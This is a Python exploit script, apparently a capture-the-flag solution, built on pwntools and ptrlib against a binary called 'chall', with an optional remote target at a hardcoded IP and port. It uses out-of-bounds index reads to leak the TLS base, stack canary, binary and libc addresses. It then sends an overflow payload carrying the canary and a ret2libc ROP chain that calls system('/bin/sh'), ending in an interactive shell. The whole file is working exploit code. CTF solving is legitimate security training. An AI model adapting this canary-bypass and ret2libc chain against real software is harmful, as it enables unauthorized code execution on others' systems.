#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

# exe = ptr.ELF("./chall")
exe = ptr.ELF("./chall_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
# libc = ptr.ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("34.170.146.252", 18136)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    # io.sendlineafter(b"index: ", b"-225")
    io.sendlineafter(b"index: ", b"-223")
    # io.sendlineafter(b"index: ", b"-226")
    fs_base = int(io.recvline().strip(b"\n"))
    master_canary_addr = fs_base + 0x28
    ptr.logger.info(f"fs_base: {hex(fs_base)}")
    ptr.logger.info(f"master_canary_addr: {hex(master_canary_addr)}")
    if not fs_base % 0x10 == 0 or fs_base == 0:
        ptr.logger.error("fs_base seemed to be incorrect.")
        exit()

    io.sendlineafter(b"index: ", b"-9")
    stack_addr = int(io.recvline().strip(b"\n"))
    ptr.logger.info(f"stack_addr (not base): {hex(stack_addr)}")

    array_addr = stack_addr - 0x198
    ptr.logger.info(f"array_addr: {hex(array_addr)}")

    master_canary_offset = master_canary_addr - array_addr
    io.sendlineafter(b"index: ", str(master_canary_offset // 8).encode())
    canary = int(io.recvline().strip(b"\n").decode())
    ptr.logger.info(f"canary: {hex(canary)}")
    if not len(hex(canary)) == 18 or not hex(canary).endswith("00"):
        ptr.logger.error("canary seemed to be incorrect.")
        exit()

    io.sendlineafter(b"index: ", b"-8")
    main_addr = int(io.recvline().strip(b"\n"))
    ptr.logger.info(f"main_addr: {hex(main_addr)}")
    exe.base = main_addr - unwrap(exe.symbol("main"))

    write_got = unwrap(exe.got("write"))
    write_got_offset = write_got - array_addr
    io.sendlineafter(b"index: ", str(write_got_offset // 8).encode())
    write_addr = int(io.recvline().strip(b"\n"))
    ptr.logger.info(f"write_addr: {hex(write_addr)}")
    libc.base = write_addr - unwrap(libc.symbol("write"))

    payload = b""
    payload += b"A" * 40
    payload += ptr.p64(canary)
    payload += b"A" * 8
    payload += ptr.p64(next(libc.gadget("ret;")))
    payload += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    payload += ptr.p64(next(libc.find("/bin/sh\0")))
    payload += ptr.p64(unwrap(libc.symbol("system")))
    io.sendlineafter(b"index: ", payload)
    input(">> ")
    io.sendlineafter(b"index: ", b"10")

    io.interactive()
    return


if __name__ == "__main__":
    main()
